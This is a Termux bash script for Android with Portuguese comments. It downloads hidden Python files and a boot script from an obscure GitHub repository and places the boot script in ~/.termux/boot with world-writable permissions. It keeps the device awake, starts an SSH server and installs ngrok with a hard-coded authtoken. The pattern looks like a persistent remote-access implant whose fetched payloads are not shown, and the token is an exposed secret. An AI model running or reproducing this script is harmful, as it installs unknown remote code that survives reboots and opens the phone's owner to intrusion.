#!/bin/bash

# Baixa os arquivos .pit.py e .pit2.py
curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit.py
curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit2.py

# Cria a estrutura de diretórios .termux/boot e entra no diretório
mkdir -p ~/.termux/boot
cd ~/.termux/boot

# Baixa o arquivo cut.sh e define as permissões
curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/cut.sh
chmod 777 cut.sh

# Instala pacotes necessários
pkg install nsnake termux-api python proot-distro -y

# Verifica se a distribuição Debian já está instalada
if ! proot-distro list | grep -q debian; then
  # Instala a distribuição Debian
  proot-distro install debian
fi

# Ativa o wake lock e inicia o servidor SSH
termux-wake-lock
sshd

# Acessa a distribuição Debian e executa os comandos adicionais
proot-distro login debian <<EOF
apt update -y
apt upgrade -y
apt install sudo -y
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update
sudo apt install ngrok -y
ngrok config add-authtoken 2evcdAeONYR2HK56AQC4bGNk61Z_6fQNMhSpeUkNaj2mU4rcV
EOF
